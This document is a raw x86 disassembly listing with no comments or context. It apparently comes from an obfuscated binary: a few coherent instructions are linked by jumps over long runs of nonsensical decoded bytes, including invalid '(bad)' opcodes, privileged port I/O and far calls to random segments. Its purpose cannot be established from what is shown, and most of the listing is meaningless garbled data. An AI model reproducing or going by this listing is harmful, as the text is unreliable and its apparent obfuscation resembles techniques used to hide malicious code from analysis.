  4049c0:	add    BYTE PTR [ebp+0x4f135ce7],al
  4049c6:	loopne 0x4049f1
  4049c8:	je     0x4049e8
  4049ca:	dec    esi
  4049cb:	adc    eax,0x64089382
  4049d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049d1:	daa    
  4049d2:	fwait
  4049d3:	push   esp
  4049d4:	xor    eax,0x495d1162
  4049d9:	mov    edx,DWORD PTR [ebp-0x24]
  4049dc:	jmp    0x404ab4
  4049e1:	pop    es
  4049e2:	add    ah,bl
  4049e4:	dec    esp
  4049e5:	out    0xed,eax
  4049e7:	scas   eax,DWORD PTR es:[edi]
  4049e8:	dec    ebx
  4049e9:	and    ch,ah
  4049eb:	and    al,0xa1
  4049ed:	push   0xae65c53e
  4049f2:	push   ds
  4049f3:	add    BYTE PTR [eax],al
  4049f5:	mov    ebx,0x1b000000
  4049fa:	lds    edx,FWORD PTR [ebx-0x34]
  4049fd:	pusha  
  4049fe:	jae    0x4049d6
  404a00:	pop    edi
  404a01:	inc    ecx
  404a02:	jmp    0x8809:0xacb15b91
  404a09:	inc    eax
  404a0a:	gs nop
  404a0c:	(bad)  
  404a0d:	stc    
  404a0e:	cld    
  404a0f:	(bad)  {k6}
  404a14:	rcl    ebp,0xe6
  404a17:	call   FWORD PTR [edx-0x70]
  404a1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a1b:	call   0x3f37:0x571b186b
  404a22:	in     al,0x45
  404a24:	neg    DWORD PTR [ecx+0x78]
  404a27:	mov    cl,0xbb
  404a29:	jl     0x404a21
  404a2b:	push   0xd70b2ac2
  404a30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a31:	sub    BYTE PTR [ebx],dh
  404a33:	xor    eax,0x2b48f3c4
  404a38:	aas    
  404a39:	aad    0x72
  404a3b:	cwde   
  404a3c:	imul   edi,DWORD PTR [ebx+0x702494ab],0x6e
  404a43:	jcxz   0x404a28
  404a46:	fimul  WORD PTR [ecx+0xe]
  404a49:	or     DWORD PTR [ebp+ebp*2-0x55],edi
  404a4d:	mov    al,0xba
  404a4f:	loopne 0x4049e3
  404a51:	and    BYTE PTR [edi-0x6cdd3391],dh
  404a57:	inc    esi
  404a58:	inc    esi
  404a59:	sub    ecx,eax
  404a5b:	sti    
  404a5c:	aas    
  404a5d:	sbb    bh,al
  404a5f:	cld    
  404a60:	cmp    al,0x71
  404a62:	push   es
  404a63:	push   ebp
  404a64:	jo     0x404ab0
  404a66:	sti    
  404a67:	aas    
  404a68:	jle    0x404a22
  404a6a:	inc    eax
  404a6b:	(bad)  
  404a6c:	mov    ebx,0x607c279c
  404a71:	push   ebp
  404a72:	lock xor BYTE PTR [eax-0x4f],dl
  404a76:	ds xchg edx,eax
  404a78:	pusha  
  404a79:	bound  ecx,QWORD PTR [ebx-0x12]
  404a7c:	inc    ebx
  404a7d:	push   ebp
  404a7e:	lods   al,BYTE PTR ds:[esi]
  404a7f:	push   cs
  404a80:	sub    al,0x61
  404a82:	jp     0x404ab6
  404a84:	cmp    BYTE PTR [ecx-0x1c],al
  404a87:	inc    esp
  404a88:	(bad)  
  404a89:	lock test edx,ebx
  404a8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a8d:	in     al,dx
  404a8e:	or     ch,BYTE PTR [eax+0x2f]
  404a91:	aam    0xcb
  404a93:	or     BYTE PTR [ebp+0x356bdaef],0x41
  404a9a:	stc    
  404a9b:	mov    DWORD PTR [esi],ebp
  404a9d:	push   ebp
  404a9e:	dec    edx
  404a9f:	in     eax,0xe1
  404aa1:	nop
  404aa2:	daa    
  404aa3:	push   ds
  404aa4:	aaa    
  404aa5:	mov    WORD PTR [ebx+0x6b04e5b1],?
  404aab:	aaa    
  404aac:	mov    esp,ecx
  404aae:	push   ecx
  404aaf:	es aam 0x64
  404ab2:	xor    al,0xe2
  404ab4:	xor    eax,esi
  404ab6:	jmp    0x404b8e
  404abb:	hlt    
  404abc:	jmp    0xfef7:0xfd1fc81f
  404ac3:	cmp    eax,0xf533cdbd
  404ac8:	mov    cl,0x44
  404aca:	lahf   
  404acb:	imul   ebx,DWORD PTR [edi],0xbb0000
  404ad1:	add    BYTE PTR [eax],al
  404ad3:	inc    edi
  404ad4:	loop   0x404acc
  404ad6:	add    al,0x9e
  404ad8:	adc    ebp,esp
  404ada:	and    ebp,DWORD PTR [esi]
  404adc:	repnz sbb eax,0x9b382af9
  404ae2:	sub    al,0xc4
  404ae4:	shr    ecx,1
  404ae6:	scas   eax,DWORD PTR es:[edi]
  404ae7:	(bad)  
  404ae8:	shr    DWORD PTR [edi],cl
  404aea:	jmp    0x404b07
  404aec:	das    
  404aed:	cdq    
  404aee:	test   DWORD PTR [ebp-0x4a],esi
  404af1:	cpuid  
  404af3:	pop    eax
  404af4:	xlat   BYTE PTR ds:[ebx]
  404af5:	cmp    ch,ah
  404af7:	push   es
  404af8:	push   edx
  404af9:	inc    ch
  404afb:	jge    0x404aab
  404afd:	icebp  
  404afe:	mov    al,ah
  404b00:	jae    0x404a9d
  404b02:	aas    
  404b03:	mov    dh,0x85
  404b05:	test   BYTE PTR [eax],ch
  404b07:	pop    esp
  404b08:	fnstsw WORD PTR [eax]
  404b0a:	out    0x2d,al
  404b0c:	and    eax,0x985571ac
  404b11:	add    edi,ebp
  404b13:	addr16 mov dl,0xd
  404b16:	enter  0xf135,0xf5
  404b1a:	sub    DWORD PTR cs:[ebx+0x7c],eax
  404b1e:	out    0x6a,eax
  404b20:	fwait
  404b21:	or     ah,0x84
  404b24:	cdq    
  404b25:	push   cs
  404b26:	mov    esp,0x323a03e0
  404b2b:	inc    eax
  404b2c:	in     al,0x3f
  404b2e:	retf   0x6ead
  404b31:	ins    BYTE PTR es:[edi],dx
  404b32:	popf   
  404b33:	xor    DWORD PTR [ebx+0x3a],edi
  404b36:	add    cl,BYTE PTR [esi]
  404b38:	std    
  404b39:	stos   DWORD PTR es:[edi],eax
  404b3a:	repnz sub al,BYTE PTR [edx-0x3]
  404b3e:	inc    ecx
  404b3f:	and    BYTE PTR [ecx-0x698c9b0e],dl
  404b45:	(bad)  
  404b46:	jecxz  0x404ad2
  404b48:	push   ss
  404b49:	push   ebx
  404b4a:	lds    ecx,FWORD PTR [ebx+0x6800d84d]
  404b50:	cmp    al,0x6f
  404b52:	xor    bh,0x4b
  404b55:	add    cl,BYTE PTR [edx]
  404b57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b58:	fdiv   QWORD PTR [edi+0x4e918dc0]
  404b5e:	pop    edx
  404b5f:	std    
  404b60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b61:	mov    ds:0xfddadb93,al
  404b66:	adc    eax,edx
  404b68:	lds    edx,FWORD PTR [edi]
  404b6a:	inc    esi
  404b6b:	sub    ah,BYTE PTR ds:0x8364fd6c
  404b71:	lods   eax,DWORD PTR ds:[esi]
  404b72:	cmp    BYTE PTR [esi+0x6b],bl
  404b75:	push   cs
  404b76:	mov    eax,ds:0xe5b846ff
  404b7b:	push   eax
  404b7c:	call   0x34230941
  404b81:	pop    esi
  404b82:	dec    ebx
  404b83:	retf   0xa4e2
  404b86:	loop   0x404c05
  404b88:	(bad)  
  404b89:	fiadd  DWORD PTR [edi]
  404b8b:	test   DWORD PTR [edi-0x4],ebx
  404b8e:	lea    eax,[eax+edx*1+0x3370c49a]
  404b95:	mov    DWORD PTR [ebp-0x24],eax
  404b98:	cmp    DWORD PTR ds:0x433544,0x0
  404b9f:	ja     0x404c91
  404ba5:	inc    DWORD PTR ds:0x43365c
  404bab:	jmp    0x404c91
  404bb0:	push   DWORD PTR [ebp-0x1c]
  404bb3:	call   DWORD PTR ds:0x43c814
  404bb9:	jmp    0x404c91
  404bbe:	mov    dh,0xba
  404bc0:	push   esi
  404bc1:	xchg   BYTE PTR [esi-0x12],bl
  404bc4:	idiv   BYTE PTR [edx+0x69dcfa70]
  404bca:	or     DWORD PTR ds:0x2024cd3a,ecx
  404bd0:	add    BYTE PTR [eax],al
  404bd2:	mov    ebx,0x4c000000
  404bd7:	dec    eax
  404bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bd9:	fwait
  404bda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bdb:	(bad)  
  404bdd:	push   es
  404bde:	ds and dl,ah
  404be1:	mov    WORD PTR [edx+0x2b1ef713],ds
  404be7:	push   esi
  404be8:	stos   DWORD PTR es:[edi],eax
  404be9:	fwait
  404bea:	mov    ?,WORD PTR [ecx+0x5b53094c]
  404bf0:	and    eax,0xa3212f3f
  404bf5:	in     al,dx
  404bf6:	and    DWORD PTR ds:0x75e380e1,ecx
  404bfc:	push   esp
  404bfd:	sti    
  404bfe:	sbb    BYTE PTR [edx+0x5e],cl
  404c01:	push   ebp
  404c02:	fdiv   DWORD PTR [ebp+0x5eefebe6]
  404c08:	push   0xecb1f49a
  404c0d:	sti    
  404c0e:	loope  0x404c06
  404c10:	call   0xd159:0xfd34f329
  404c17:	pop    ebx
  404c18:	push   ss
  404c19:	out    dx,eax
  404c1a:	cmp    eax,DWORD PTR [edx+0x2357d876]
  404c20:	int3   
  404c21:	mov    bl,0xb6
  404c23:	fs jmp 0x8c3d:0xd84a462a
  404c2b:	iret   
  404c2c:	rcl    BYTE PTR [esi+esi*1+0x4a],cl
  404c30:	add    DWORD PTR [edx-0x1d52867c],ebx
  404c36:	data16 sahf 
  404c38:	push   ebp
  404c39:	or     esi,eax
  404c3b:	ror    ebp,cl
  404c3d:	adc    edx,eax
  404c3f:	inc    edx
  404c40:	loopne 0x404c8a
  404c42:	mov    ah,0xd4
  404c44:	lea    edx,[edx]
  404c46:	pop    esp
  404c47:	aam    0x6
  404c49:	es fisub DWORD PTR fs:[edi-0x7bdafd83]
  404c51:	ss or  edx,ecx
  404c54:	pop    edx
  404c55:	daa    
  404c56:	mov    WORD PTR [eax-0x751c9780],ds
  404c5c:	mov    ah,0x6e
  404c5e:	sub    al,0xad
  404c60:	push   cs
  404c61:	jno    0x404c5d
  404c63:	test   BYTE PTR [ebx+0x15f33b95],bl
  404c69:	icebp  
  404c6a:	xor    al,0x21
  404c6c:	jmp    0xd23d:0x6a780224
  404c73:	addr16 pop edx
  404c75:	sub    ebx,DWORD PTR [esi]
  404c77:	mov    ebx,0x10a8c631
  404c7c:	xchg   ch,bh
  404c7e:	jb     0x404c20
  404c80:	add    dh,BYTE PTR [esi-0x297cdc58]
  404c86:	xor    al,0xe2
  404c88:	sub    al,0x75
  404c8a:	ret    
  404c8b:	mov    ebp,0x42eaf73
  404c90:	dec    ecx
  404c91:	mov    eax,DWORD PTR [ecx]
  404c93:	mov    edx,DWORD PTR [ecx+0x4]
  404c96:	jmp    0x404d6e
  404c9b:	push   esi
  404c9c:	nop
  404c9d:	mov    ebp,0xde7dff71
  404ca2:	mov    bh,0x94
  404ca4:	cs loope 0x404cb4
  404ca7:	dec    eax
  404ca8:	fadd   st(3),st
  404caa:	dec    esi
  404cab:	fbld   TBYTE PTR [eax]
  404cad:	add    BYTE PTR [eax],al
  404caf:	mov    ebx,0xea000000
  404cb4:	les    esp,FWORD PTR [esi-0x7b7804fb]
  404cba:	jl     0x404c7b
  404cbc:	mov    al,0xcb
  404cbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cbf:	push   eax
  404cc0:	mov    edx,0x2dfd02e3
  404cc5:	stc    
  404cc6:	sbb    bl,bh
  404cc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cc9:	pop    ebp
  404cca:	div    BYTE PTR [ecx+edi*2]
  404ccd:	and    esi,ecx
  404ccf:	loopne 0x404c86
  404cd1:	xchg   BYTE PTR [eax+0x73e1f499],cl
  404cd7:	pop    edx
  404cd8:	mov    WORD PTR [esi+0x4292f47f],ds
  404cde:	and    BYTE PTR [eax-0x60],al
  404ce1:	dec    ecx
  404ce2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ce3:	bound  esi,QWORD PTR [eax]
  404ce5:	in     eax,0x2b
  404ce7:	and    BYTE PTR [esi-0x5a],ch
  404cea:	mov    dh,0x16
  404cec:	icebp  
  404ced:	loop   0x404cac
  404cef:	repz cdq 
  404cf1:	mov    al,0xdc
  404cf3:	xor    cl,ch
  404cf5:	dec    ecx
  404cf6:	scas   al,BYTE PTR es:[edi]
  404cf7:	push   edi
  404cf8:	sbb    BYTE PTR [eax],dl
  404cfa:	xchg   ecx,eax
  404cfb:	fcmovu st,st(4)
  404cfd:	in     eax,dx
  404cfe:	scas   eax,DWORD PTR es:[edi]
  404cff:	sbb    al,0xe5
  404d01:	mov    al,0x49
  404d03:	jmp    esi
  404d05:	pop    ss
  404d06:	mov    dl,0xa7
  404d08:	and    DWORD PTR [ecx+edx*2+0x560ea2db],edi
  404d0f:	and    al,0x75
  404d11:	sub    al,0x4
  404d13:	and    BYTE PTR [ebp-0x553e7241],dl
  404d19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d1a:	mov    ch,0xa6
  404d1c:	inc    edx
  404d1d:	xor    eax,0xae295a1f
  404d22:	push   esi
  404d23:	push   ecx
  404d24:	sbb    BYTE PTR ds:0xd8a743de,bh
  404d2a:	fdivr  QWORD PTR [edx]
  404d2c:	and    DWORD PTR [ebx-0x23eb8422],0x6529d13
  404d36:	int3   
  404d37:	aaa    
  404d38:	cwde   
  404d39:	mov    ebp,DWORD PTR [edx+0x450a1ee5]
  404d3f:	xchg   esi,eax
  404d40:	jg     0x404cfa
  404d42:	mov    dh,0xeb
  404d44:	inc    edi
  404d45:	adc    DWORD PTR [ecx-0x41],edx
  404d48:	add    DWORD PTR [edi+ebx*4],0xd630981e
  404d4f:	mov    eax,DWORD PTR [ebp-0x54]
  404d52:	add    ebx,edx
  404d54:	jmp    0xe45d51f2
  404d59:	hlt    
  404d5a:	mov    eax,0xea8393da
  404d5f:	out    dx,al
  404d60:	pop    esp
  404d61:	sbb    esi,DWORD PTR [esi-0x71]
  404d64:	and    BYTE PTR [esi+0x3b],al
  404d67:	pop    ds
  404d68:	jp     0x404d4f
  404d6a:	ret    
  404d6b:	dec    eax
  404d6c:	inc    ebx
  404d6d:	ja     0x404da2
  404d6f:	(bad)  
  404d70:	sub    eax,0x66479db3
  404d75:	imul   eax,DWORD PTR [ebp-0x24]
  404d79:	mov    DWORD PTR [ebp-0x24],eax
  404d7c:	sbb    edx,edx
  404d7e:	mov    eax,DWORD PTR [ecx]
  404d80:	adc    edx,DWORD PTR ds:0x4335b0
  404d86:	mov    edx,DWORD PTR [ecx+0x4]
  404d89:	jmp    0x404e61
  404d8e:	adc    BYTE PTR [ebp-0x4a],0x58
  404d92:	idiv   ebx
  404d94:	out    dx,al
  404d95:	fistp  QWORD PTR [eax]
  404d97:	jmp    0xe484:0x98b033b4
  404d9e:	call   0x0:0xbb000021
  404da5:	add    al,ah
  404da7:	ror    BYTE PTR [ecx-0x5829f218],1
  404dad:	sti    
  404dae:	shr    BYTE PTR [ecx-0x104a4797],cl
  404db4:	es jno 0x404d6b
  404db7:	outs   dx,DWORD PTR ds:[esi]
  404db8:	push   eax
  404db9:	ins    BYTE PTR es:[edi],dx
  404dba:	pusha  
  404dbb:	sbb    DWORD PTR [eax-0x6ccaa96c],esi
  404dc1:	cmp    BYTE PTR [edx-0x11],cl
  404dc4:	outs   dx,BYTE PTR ds:[esi]
  404dc5:	ins    BYTE PTR es:[edi],dx
  404dc6:	fs repz into 
  404dc9:	pop    ds
  404dca:	popa   
  404dcb:	xor    DWORD PTR gs:[eax],edx
  404dce:	lea    esi,[edi]
  404dd0:	cli    
  404dd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dd2:	and    DWORD PTR [eax],0x4f71466f
  404dd8:	push   ss
  404dd9:	push   ecx
  404dda:	xchg   BYTE PTR [eax-0xb],cl
  404ddd:	ins    BYTE PTR es:[edi],dx
  404dde:	xchg   ebx,eax
  404ddf:	pop    ebx
  404de0:	xor    eax,0x1d654ee9
  404de5:	sahf   
  404de6:	not    DWORD PTR [ebp-0x7a93947b]
  404dec:	imul   edx,DWORD PTR [ecx+0x72],0x1e850cdd
  404df3:	(bad)  
  404df4:	in     al,dx
  404df5:	mov    eax,0x4bbdbeb3
  404dfa:	sbb    edi,esi
  404dfc:	gs test ah,ch
  404dff:	ja     0x404d9e
  404e01:	cmp    eax,0x68800170
  404e06:	int3   
  404e07:	add    BYTE PTR [ecx+0x66d605d5],0xeb
  404e0e:	and    eax,0xc54426e9
  404e13:	(bad)  
  404e14:	retf   0xa5b8
  404e17:	ret    
  404e18:	mov    gs:0xcebf33f,eax
  404e1e:	pop    ebx
  404e1f:	inc    esi
  404e20:	sub    ebx,DWORD PTR [edi+esi*2]
  404e23:	jp     0x404e89
  404e25:	sub    DWORD PTR [ebx+0x2f],ebp
  404e28:	fs cwde 
  404e2a:	jae    0x404e46
  404e2c:	mov    cl,0x57
  404e2e:	lods   al,BYTE PTR ds:[esi]
  404e2f:	loop   0x404e98
  404e31:	fcomp  DWORD PTR es:[ecx+0x5e72b5c2]
  404e38:	ficom  DWORD PTR [ecx]
  404e3a:	inc    eax
  404e3b:	xchg   esi,eax
  404e3c:	ror    esp,1
  404e3e:	dec    ecx
  404e3f:	jnp    0x404e46
  404e41:	pop    ecx
  404e42:	dec    edx
  404e43:	aad    0x11
  404e45:	mov    bh,0x87
  404e47:	jle    0x404dd4
  404e49:	add    eax,0xb75dcf55
  404e4e:	push   edx
  404e4f:	int    0x9e
  404e51:	pop    eax
  404e52:	inc    esi
  404e53:	sbb    al,BYTE PTR [edx]
  404e55:	pop    ebp
  404e56:	in     eax,0xfe
  404e58:	mov    DWORD PTR [ebx+0x5f4e7c00],ebp
  404e5e:	or     edx,DWORD PTR [ebx+0x10558b8d]
  404e64:	adc    DWORD PTR ds:0x433614,0x433610
  404e6e:	xor    eax,esi
  404e70:	sbb    DWORD PTR ds:0x433570,0x433678
  404e7a:	sub    eax,DWORD PTR [ebp-0x24]
  404e7d:	add    eax,0x99b8624d
  404e82:	mov    DWORD PTR ds:0x43359c,0x46cf
  404e8c:	cmp    DWORD PTR [edx],eax
  404e8e:	mov    DWORD PTR ds:0x43360c,edx
  404e94:	mov    eax,DWORD PTR [ebp+0x10]
  404e97:	mov    DWORD PTR ds:0x433640,0x50b0
  404ea1:	jmp    0x404f79
  404ea6:	and    DWORD PTR cs:[esi-0x100060a3],edx
  404ead:	jae    0x404f10
  404eaf:	push   esi
  404eb0:	in     al,dx
  404eb1:	or     eax,0xd6e31fb
  404eb6:	push   ebp
  404eb7:	and    al,BYTE PTR [eax]
  404eb9:	add    BYTE PTR [ebx+0x3b000000],bh
  404ebf:	pop    edi
  404ec0:	out    0xd0,eax
  404ec2:	mov    ah,0x6c
  404ec4:	or     al,0x32
  404ec6:	mov    gs,WORD PTR [ebx+0x5dd6d606]
  404ecc:	push   edx
  404ecd:	mov    DWORD PTR [eax-0x7c8c5db6],edx
  404ed3:	retf   0xd511
  404ed6:	call   0x2542:0x673e4e5
  404edd:	(bad)  
  404ede:	dec    edi
  404edf:	add    DWORD PTR [esi-0x79],eax
  404ee2:	xlat   BYTE PTR ds:[ebx]
  404ee3:	xchg   ebx,eax
  404ee4:	les    edx,FWORD PTR [edi-0x75]
  404ee7:	iret   
  404ee8:	test   BYTE PTR [ebx+eax*8],bh
  404eeb:	(bad)  
  404eec:	test   al,0x2
  404eee:	jo     0x404f00
  404ef0:	push   esp
  404ef1:	ret    
  404ef2:	add    al,0x46
  404ef4:	je     0x404f56
  404ef6:	mov    bh,0x82
  404ef8:	jne    0x404ed2
  404efa:	adc    cl,ah
  404efc:	mov    DWORD PTR [ebx+0x28],ebx
  404eff:	push   ebp
  404f00:	jno    0x404f66
  404f02:	repz call 0x20b9:0x9751cc59
  404f0a:	scas   eax,DWORD PTR es:[edi]
  404f0b:	sbb    eax,0x328abd6f
  404f10:	sbb    edx,DWORD PTR [edx+eax*1]
  404f13:	aam    0x26
  404f15:	adc    DWORD PTR [eax+0x796f3496],0xffffff8e
  404f1c:	stc    
  404f1d:	sahf   
  404f1e:	fbld   TBYTE PTR [edi-0x46e36bf5]
  404f24:	jp     0x404eed
  404f26:	mov    al,ds:0xb1e460b7
  404f2b:	xchg   ebx,eax
  404f2c:	ror    edi,1
  404f2e:	dec    eax
  404f2f:	hlt    
  404f30:	popa   
  404f31:	xor    BYTE PTR [ecx-0x2b],al
  404f34:	gs xor eax,0x272a6eee
  404f3a:	mov    dl,BYTE PTR ds:0x38984149
  404f40:	out    0xdd,eax
  404f42:	in     eax,0x1
  404f44:	mov    BYTE PTR [edx+0x1a545261],bl
  404f4a:	dec    ecx
  404f4b:	push   es
  404f4c:	mov    cl,BYTE PTR [ebx+0x18cef55e]
  404f52:	push   ecx
  404f53:	jmp    0x788b0f41
  404f58:	arpl   WORD PTR [ecx+0x3e8ec495],dx
  404f5e:	mov    al,ds:0x9d43ef7
  404f63:	ror    BYTE PTR [ecx],1
  404f65:	sub    DWORD PTR [edx+0xf3ae1de],ebp
  404f6b:	leave  
  404f6c:	add    eax,0xd224bcbc
  404f71:	fwait
  404f72:	mov    ds:0x7221eea,al
  404f77:	pusha  
  404f78:	pop    es
  404f79:	jg     0x40550f
  404f7f:	sub    DWORD PTR ds:0x433664,edx
  404f85:	jmp    0x40505d
  404f8a:	outs   dx,DWORD PTR ds:[esi]
  404f8b:	and    esi,ebx
  404f8d:	cmp    eax,0x73effdff
  404f92:	add    edi,DWORD PTR [bp+si]
  404f95:	fisubr WORD PTR [ecx+0x10675536]
  404f9b:	and    eax,DWORD PTR [eax]
  404f9d:	add    BYTE PTR [ebx+0xc000000],bh
  404fa3:	gs or  al,0xf2
  404fa6:	(bad)  
  404fa7:	xor    eax,0xeb1c751
  404fac:	push   edi
  404fad:	les    eax,FWORD PTR [edx-0x75]
  404fb0:	jnp    0x404fd8
  404fb2:	mov    ds:0x90b6929f,eax
  404fb7:	xor    DWORD PTR [eax+0x89fbec6],eax
  404fbd:	push   cs
  404fbe:	dec    edx
  404fbf:	xlat   BYTE PTR ds:[ebx]
  404fc0:	xchg   ebx,eax
  404fc1:	or     BYTE PTR [edi-0x6974de62],al
  404fc7:	sbb    ah,ch
  404fc9:	pop    es
  404fca:	cmp    BYTE PTR [edi],bh
  404fcc:	and    DWORD PTR [ebx],esp
  404fce:	sub    ah,BYTE PTR [esi+0x77]
  404fd1:	stc    
  404fd2:	push   ss
  404fd3:	add    BYTE PTR [edi],0xfd
  404fd6:	xchg   ah,bh
  404fd8:	add    bh,BYTE PTR [ebx+0x55]
  404fdb:	imul   edi,DWORD PTR [eax-0xa06b565],0x40cfca94
  404fe5:	add    BYTE PTR [esi-0x596e0ccf],bh
  404feb:	cld    
  404fec:	dec    edx
  404fed:	and    al,0xf4
  404fef:	sbb    eax,0x87abaf72
  404ff4:	repz mov edi,0x5322e537
  404ffa:	lahf   
  404ffb:	rcr    esp,1
  404ffd:	sbb    esi,DWORD PTR [esi]
  404fff:	daa    
  405000:	jae    0x405027
  405002:	jno    0x405001
  405004:	xchg   esp,eax
  405005:	mov    bh,0xb2
  405007:	adc    eax,0x90fe4bd0
  40500c:	cld    
  40500d:	and    BYTE PTR [esi+eiz*4+0x1a8f557c],al
  405014:	jle    0x405070
  405016:	add    eax,0x5c9601d
  40501b:	fisttp WORD PTR [esi+0x2d39c124]
  405021:	retf   
  405022:	lock loope 0x40505f
  405025:	ins    DWORD PTR es:[edi],dx
  405026:	rol    BYTE PTR ds:0xc389a58c,0x6
  40502d:	or     cl,ch
  40502f:	ins    BYTE PTR es:[edi],dx
  405030:	gs mov bh,0x68
  405034:	aam    0x80
  405036:	xchg   edx,eax
  405037:	or     DWORD PTR [esi],eax
  405039:	ss jo  0x40508b
  40503c:	fwait
  40503d:	ret    0xfa80
  405040:	or     BYTE PTR ds:[edx+0x7e41042a],dl
  405047:	lock dec edi
  405049:	pop    ebx
  40504a:	or     ebp,ecx
  40504c:	mov    fs,WORD PTR [edx]
  40504e:	fistp  QWORD PTR [edi]
  405050:	mov    al,ds:0x838fa118
  405055:	dec    esp
  405056:	and    DWORD PTR [ebp-0x5a],esp
  405059:	mov    ds:0x891fd213,al
  40505e:	inc    ebp
  40505f:	fcomp  QWORD PTR [ebx]
  405061:	adc    eax,0x433540
  405066:	mov    eax,DWORD PTR [ebp+0x20]
  405069:	neg    edx
  40506b:	mov    edx,DWORD PTR [ebp+0x24]
  40506e:	xor    eax,esi
  405070:	jmp    0x405148
  405075:	add    DWORD PTR [edi-0x6a],0xffffff8e
  405079:	(bad)  
  40507a:	fistp  WORD PTR [ebx+0x5b205f4f]
  405080:	(bad)  
  405081:	retf   
  405082:	nop
  405083:	xor    ebp,DWORD PTR [ecx-0x35]
  405086:	and    eax,DWORD PTR [eax]
  405088:	add    BYTE PTR [ebx-0x4b000000],bh
  40508e:	inc    ecx
  40508f:	loope  0x4050cb
  405091:	jg     0x405033
  405093:	sub    bl,BYTE PTR [eax-0x4db0ca8e]
  405099:	push   eax
  40509a:	mov    al,0xb5
  40509c:	retf   0x1e2a
  40509f:	call   0x8140254f
  4050a4:	cli    
  4050a5:	(bad)  
  4050a7:	add    eax,0x356445d4
  4050ac:	ret    
  4050ad:	(bad)  [eax]
  4050af:	cmp    eax,0xea818e52
  4050b4:	clc    
  4050b5:	mov    eax,db7
  4050b8:	hlt    
  4050b9:	mov    es,WORD PTR [ebx+ecx*1+0x7c54225a]
  4050c0:	mov    dh,0x95
  4050c2:	xchg   esp,eax
  4050c3:	or     DWORD PTR [edi+esi*8-0x41842929],esi
  4050ca:	xor    al,0x83
  4050cc:	imul   DWORD PTR [ebx-0x7c221f1d]
  4050d2:	retf   
  4050d3:	mov    al,0xfb
  4050d5:	enter  0xf313,0x66
  4050d9:	xor    al,0x4
  4050db:	fimul  WORD PTR [eax-0x3d]
  4050de:	mov    ebp,DWORD PTR [ebx+0x776c0c87]
  4050e4:	mov    al,0x89
  4050e6:	(bad)  
  4050e7:	les    ebx,FWORD PTR [esi]
  4050e9:	inc    ecx
  4050ea:	(bad)  
  4050ec:	rep lock outs dx,BYTE PTR ds:[esi]
  4050ef:	loop   0x4050ba
  4050f1:	cmc    
  4050f2:	ds fs inc ebx
  4050f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050f6:	sar    BYTE PTR ds:0x6d9125d,0xb9
  4050fd:	xchg   ebp,eax
  4050fe:	retf   0x9c62
  405101:	dec    edx
  405102:	in     eax,0x2f
  405104:	cmp    DWORD PTR [ebp-0x2a],0xd501be15
  40510b:	push   es
  40510c:	adc    al,0x5d
  40510e:	js     0x40517e
  405110:	add    BYTE PTR [ecx-0x46b319a3],cl
  405116:	sbb    ebp,eax
  405118:	comiss xmm7,DWORD PTR [ebp-0x3db5aab2]
  40511f:	(bad)
  405122:	fwait
  405123:	je     0x405154
  405125:	mov    ss,eax
  405127:	fidivr WORD PTR [ebx+0x3]
  40512a:	xchg   DWORD PTR [edi-0x398c38d5],edi
  405130:	or     cl,BYTE PTR [edx+0x33b9ac50]
  405136:	fwait
  405137:	arpl   bp,ax
  405139:	sar    DWORD PTR [edi+0x4c663542],0x35
  405140:	add    eax,DWORD PTR [ebx-0x43b13a5]
  405146:	inc    ecx
  405147:	scas   eax,DWORD PTR es:[edi]
  405148:	add    eax,0x99b8624d
  40514d:	jmp    0x405225
  405152:	repz cmp DWORD PTR [ebx],edx
  405155:	sbb    bl,0xaa
  405158:	repz jns 0x405196
  40515b:	or     eax,0x9498cd7c
  405160:	xor    ch,BYTE PTR [ecx-0x7a]
  405163:	and    al,0x0
  405165:	add    BYTE PTR [ebx-0x69000000],bh
  40516b:	imul   eax,DWORD PTR [esi+0x49],0xffffff88
  40516f:	fisttp DWORD PTR [eax-0x6d84251c]
  405175:	aad    0x56
  405177:	les    edi,FWORD PTR [edi]
  405179:	jmp    0x4051f2
  40517b:	jl     0x4051b3
  40517d:	push   es
  40517e:	push   0x22
  405180:	icebp  
  405181:	sub    al,0x5b
  405183:	jecxz  0x405189
  405185:	idiv   DWORD PTR [eax+0x45e95999]
  40518b:	sti    
  40518c:	dec    eax
  40518d:	pop    ss
  40518e:	rcr    ch,1
  405190:	jo     0x4051a0
  405192:	fs scas al,BYTE PTR es:[edi]
  405194:	jl     0x405138
  405196:	and    BYTE PTR [esp+ebp*2],dh
  405199:	nop
  40519a:	pop    eax
  40519b:	pusha  
  40519c:	iret   
  40519d:	imul   esi,DWORD PTR [ebp-0x36],0x9ff51709
  4051a4:	push   ecx
  4051a5:	xchg   ebp,eax
  4051a6:	or     eax,0x31912fe4
  4051ab:	jb     0x40518e
  4051ad:	fiadd  DWORD PTR [edi]
  4051af:	loopne 0x405197
  4051b1:	out    0x72,eax
  4051b3:	inc    eax
  4051b4:	popa   
  4051b5:	push   es
  4051b6:	jnp    0x40517f
  4051b8:	adc    al,0xba
  4051ba:	mov    edi,0x739e7b98
  4051bf:	popa   
  4051c0:	pop    es
  4051c1:	int3   
  4051c2:	ficomp DWORD PTR [ecx]
  4051c4:	sub    eax,0xbb1c83c4
  4051c9:	popf   
  4051ca:	jbe    0x40517f
  4051cc:	pop    esp
  4051cd:	lea    ebp,[edx]
  4051cf:	xchg   ecx,eax
  4051d0:	loopne 0x405203
  4051d2:	lods   al,BYTE PTR ds:[esi]
  4051d3:	adc    DWORD PTR [edi-0x64],ebx
  4051d6:	popa   
  4051d7:	outs   dx,BYTE PTR es:[esi]
  4051d9:	sti    
  4051da:	push   ecx
  4051db:	lock enter 0x7cee,0xdc
  4051e0:	mov    ebx,0xa4b5a235
  4051e5:	cmp    esi,ebp
